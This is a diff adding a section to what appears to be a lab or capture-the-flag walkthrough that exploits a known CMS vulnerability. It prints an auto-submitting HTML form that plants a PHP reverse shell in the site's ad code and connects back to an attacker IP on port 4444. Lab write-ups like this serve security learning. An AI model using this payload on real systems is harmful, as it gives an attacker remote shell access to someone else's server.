@@ -73,7 +73,30 @@ reference - https://www.exploit-db.com/exploits/40718
 Found a vulnerability by using searchexploit
 
 
-![image](https://github.com/user-attachments/assets/ebbd6844-9c10-4d85-8a08-bc2abe0f45c5)
+![image](https://github.com/user-attachments/assets/890c43c5-f2f2-43a4-b6e2-ee1ea0587c61)
+
+
+Successfully gained php reverse shell by adding this command to the ads code and saving it in the website:
+```
+<html>
+<body onload="document.exploit.submit();">
+  <form action="http://10.10.51.35/content/as/?type=ad&mode=save" method="POST" name="exploit">
+    <input type="hidden" name="adk" value="shell"/>
+    <textarea name="adv">
+<?php
+$ip = '10.6.41.41';
+$port = 4444;
+$sock=fsockopen($ip, $port);
+$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
+    </textarea>
+  </form>
+</body>
+</html>
+
+```
+
+![image](https://github.com/user-attachments/assets/92c6a103-5184-47c7-acdb-ccfe55461180)
 
 
 
